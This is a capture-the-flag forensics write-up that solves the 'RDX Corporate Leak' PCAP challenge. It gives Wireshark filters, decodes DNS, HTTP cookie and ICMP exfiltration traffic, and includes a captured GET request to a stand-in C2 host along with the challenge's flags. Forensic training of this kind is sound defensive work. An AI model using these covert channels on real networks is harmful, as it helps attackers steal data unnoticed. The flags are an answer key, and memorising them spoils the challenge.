# 🕵️ RDX Corporate Leak - Writeup

**Author**:Usman Ibrahim
**Category**: Forensics  
**Difficulty**: Medium 
**File**: `rdx_corporate_leak.pcap`  
**Flag Format**: `RDX{...}`

---

## 🧩 Challenge Summary

"RDX Corporation's SOC team intercepted suspicious network traffic.The attacker used **covert channels** to exfiltrate sensitive data without triggering alerts.At the end, combine the contents of the three flags (excluding the flag format: RDX{}) into a single final flag in the format:RDX{flag1_flag2_flag3} Note: Before combining sort the flags by the ASCII value of the 2nd character inside the braces (i.e., the second character of the flag content) in ascending order.",

---

## 🔍 Solution

The PCAP contains **three distinct covert exfiltration methods**:

---

### ✅ 1. DNS-Based Exfiltration

#### 🔎 Step-by-step:

1. Filter DNS traffic:
dns.qry.name contains "leak.rdxcorp.net"

2. Observe base32-encoded subdomains:
KJCFQ63ENY2V63BTGRVV6M3YMZUWY7I= → RDX{dn5_l34k_3xfil}

#### 🏁 Flag:
RDX{dn5_l34k_3xfil}

---

### ✅ 2. HTTP Header (Cookie) Exfiltration

#### 🔎 Step-by-step:

1. Filter HTTP GET requests:
http.request.method == "GET"

2. Inspect HTTP headers:
GET /report HTTP/1.1
Host: c2.rdxcorp.net
Cookie: session=RDX{http_c00kie_exfil}

#### 🏁 Flag:
RDX{http_c00kie_exfil}

---

### ✅ 3. ICMP Echo Payload Exfiltration

#### 🔎 Step-by-step:

1. Filter ICMP Echo requests:
icmp.type == 8

2. Inspect each ICMP packet's payload:
- Data bytes: 52 44 58 7b 31 63 6d 70 5f 74 75 6e 6e 33 6c 5f 6c 65 61 6b 7d
- ASCII equivalent: R D X { 1 c m p _ t u n n 3 l _ l e a k }

3. Reconstruct the flag:
RDX{1cmp_tunn3l_leak}

#### 🏁 Flag:
RDX{1cmp_tunn3l_leak}

---

## 🏁 Final Flags

| Method      | Flag                         |
|-------------|------------------------------|
| DNS         | `RDX{dn5_l34k_3xfil}`         |
| HTTP Cookie | `RDX{http_c00kie_exfil}`     |
| ICMP Echo   | `RDX{1cmp_tunn3l_leak}`       |

According to the flag format:

## 🏁 Final Flag
RDX{1cmp_tunn3l_leak_dn5_l34k_3xfil_http_c00kie_exfil}
---





